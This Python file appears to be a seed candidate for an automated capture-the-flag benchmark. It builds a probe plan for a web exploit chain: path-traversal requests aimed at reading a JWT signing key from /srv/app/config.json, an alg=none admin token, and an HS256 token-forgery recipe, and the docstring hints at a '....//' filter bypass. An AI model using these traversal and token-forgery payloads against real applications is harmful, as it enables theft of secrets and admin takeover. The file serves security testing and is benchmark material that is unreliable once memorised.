# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 The ESN authors.
"""Seed candidate for the web CTF chain.

``solve()`` is a **pure** strategy generator: it builds a plan of probe
*attempts* with ordinary Python and returns it, doing no I/O. The evaluator runs
every request against the in-process app and scores measured behavior.

Two attempt families (see ``evaluator.py`` for the contract):

- ``traversal``: a list of ``{"path": "..."}`` requests to ``download(path)``.
  Escaping the static base reaches ``/srv/app/config.json`` (which holds the JWT
  signing key); the response *class* is the gradient.
- ``jwt``: a list of ``{"header": {...}, "claims": {...}, "key_slot": "..."}``
  recipes. The evaluator builds and signs the token itself, substituting the
  recovered signing key for the ``{leaked_key}`` slot, then measures whether the
  app accepts it. Admin access requires a valid HS256 signature, a future
  ``exp``, and ``role == "admin"``.

This seed makes only naive moves: it reads a public file and a couple of obvious
(filtered) traversals, gets a low ``alg=none`` guest bypass, and an HS256 recipe
that is missing a valid ``exp``. Discovering the ``....//`` sanitizer bypass, the
``/srv/app/config.json`` path, and the complete admin forge is left to the search.
"""

INITIAL_SOLUTION = """\
# Pure candidate: build a web-exploit probe plan for the in-process CTF app.
# No network/filesystem/crypto here -- the evaluator performs all I/O and signs
# every token itself (substituting the recovered key for {leaked_key}).

APP_EPOCH = 1700000000  # the app's fixed clock; a valid token needs exp > this


def solve():
    traversal = [
        {"path": "index.html"},                       # public file (in-base)
        {"path": "robots.txt"},                        # recon hint
        {"path": "../../srv/app/config.json"},         # naive traversal (filtered out)
        {"path": "/srv/app/config.json"},              # naive absolute (stays in base)
    ]

    jwt = [
        # Low rung: an unsigned alg=none token is accepted as a guest.
        {"header": {"alg": "none", "typ": "JWT"}, "claims": {"role": "admin"}},
        # HS256 recipe using the recovered key, but with no valid exp yet.
        {
            "header": {"alg": "HS256", "typ": "JWT"},
            "claims": {"role": "admin"},
            "key_slot": "{leaked_key}",
        },
    ]

    return {"target": "web_ctf_chain", "traversal": traversal, "jwt": jwt}
"""
